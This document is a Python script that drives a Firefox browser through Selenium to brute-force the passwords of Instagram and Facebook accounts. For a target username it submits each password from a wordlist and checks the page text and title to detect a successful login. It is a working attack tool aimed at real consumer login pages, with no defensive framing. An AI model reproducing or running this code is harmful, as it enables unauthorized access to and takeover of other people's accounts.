from selenium import webdriver
import os
import time
from selenium.webdriver.common.keys import Keys
def instagram(username,wordlist,internet):
    os.system("rm geckodriver.log")
    internet = int(internet)
    driver = webdriver.Firefox(executable_path="file/geckodriver")
    driver.delete_all_cookies()
    driver.get("https://www.instagram.com/accounts/login/")
    time.sleep(internet+1)
    user = driver.find_element_by_xpath("/html/body/div[1]/section/main/div/article/div/div[1]/div/form/div[2]/div/label/input")
    user.send_keys(username)
    pw = open(wordlist,'r')

    while 0<1:
        x = pw.readline()
        print('======================')
        print("username : "+username)
        print("password : "+x)
        password = driver.find_element_by_xpath('/html/body/div[1]/section/main/div/article/div/div[1]/div/form/div[3]/div/label/input')
        password.send_keys(x)
        time.sleep(0.5+internet)
        driver.find_element_by_xpath("/html/body/div[1]/section/main/div/article/div/div[1]/div/form/div[4]").click()


        if driver.title == "Login â€¢ Instagram":
            time.sleep(internet+1)
            if not "Sorry, your password was incorrect. Please double-check your password." in driver.page_source and not "The username you entered doesn't belong to an account. Please check your username and try again." in driver.page_source:
                print("\n\n=====password found=====")
                print("username : "+username)
                print("password : "+x)
                break
            elif "The username you entered doesn't belong to an account. Please check your username and try again." in driver.page_source:
                print("username anda salah tolong setting ulang")
                driver.close()
                break
            elif x == "":
                print("=====password not found=====")
                driver.close()
                break
            password.clear()


def facebook(username,wordlist,internet):
    os.system("rm geckodriver.log")
    internet = int(internet)
    driver = webdriver.Firefox(executable_path="file/geckodriver")
    driver.delete_all_cookies()
    driver.get("https://mbasic.facebook.com/login")
    time.sleep(internet+1)
    user = driver.find_element_by_xpath("//*[@id='m_login_email']")
    user.send_keys(username)
    pw = open(wordlist,'r')

    while 0<1:
        x = pw.readline()
        print('======================')
        print("username : "+username)
        print("password : "+x)
        password = driver.find_element_by_xpath('/html/body/div/div/div[2]/div/table/tbody/tr/td/div[2]/div[2]/form/ul/li[2]/section/input')
        password.send_keys(x)
        time.sleep(0.5+internet)
        driver.find_element_by_xpath("/html/body/div/div/div[2]/div/table/tbody/tr/td/div[2]/div[2]/form/ul/li[3]/input").click()


        if driver.title == "Masuk Facebook | Facebook":
            time.sleep(internet+1)
            if x == "":
                print("=====password not found=====")
                driver.close()
                break
            elif "Nomor ponsel atau email yang Anda masukkan tidak cocok dengan akun apa pun" in driver.page_source:
                print("username anda salah tolong setting ulang")
                driver.close()
                break
        elif not "Masuk Facebook | Facebook" in driver.title:
            print("\n\n=====password found=====")
            print("username : "+username)
            print("password : "+x)
            break


            